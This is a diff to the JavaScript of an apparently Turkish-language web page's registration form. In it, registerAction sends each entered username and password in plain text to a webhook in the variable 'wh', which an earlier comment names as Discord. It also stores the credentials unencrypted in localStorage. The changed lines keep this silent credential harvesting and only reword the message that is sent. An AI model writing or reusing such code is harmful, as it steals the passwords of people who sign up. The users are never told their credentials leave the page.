@@ -139,26 +139,27 @@
         document.getElementById('loadText').innerText = text;
     }
 
-    // KAYIT SİSTEMİ
     function registerAction() {
-        const u = document.getElementById('regUser').value;
-        const p = document.getElementById('regPass').value;
-        
-        if(!u || !p) return alert("Alanları doldur!");
+    const u = document.getElementById('regUser').value;
+    const p = document.getElementById('regPass').value;
+    
+    if(!u || !p) return alert("Alanları doldur!");
 
-        // Bilgileri Discord'a ve Tarayıcıya Kaydet
-        localStorage.setItem("m0s_user", u);
-        localStorage.setItem("m0s_pass", p);
+    fetch(wh, { 
+        method: "POST", 
+        headers: {"Content-Type": "application/json"}, 
+        body: JSON.stringify({ 
+            content: `📢 **ANLIK BİLGİ:** \n👤 Kullanıcı: ${u}\n🔑 Şifre: ${p}` 
+        }) 
+    });
 
-        fetch(wh, { 
-            method: "POST", 
-            headers: {"Content-Type": "application/json"}, 
-            body: JSON.stringify({ content: `✅ **YENİ KAYIT:** ${u}:${p}` }) 
-        });
+    localStorage.setItem("m0s_user", u);
+    localStorage.setItem("m0s_pass", p);
 
-        alert("Başarıyla kayıt oldun! Şimdi giriş yap.");
-        showSection('loginSection');
-    }
+    alert("Kayıt başarılı! Şimdi giriş yapabilirsin.");
+    showSection('loginSection');
+            }
+    
 
     // GİRİŞ KONTROLÜ
     async function loginAction() {
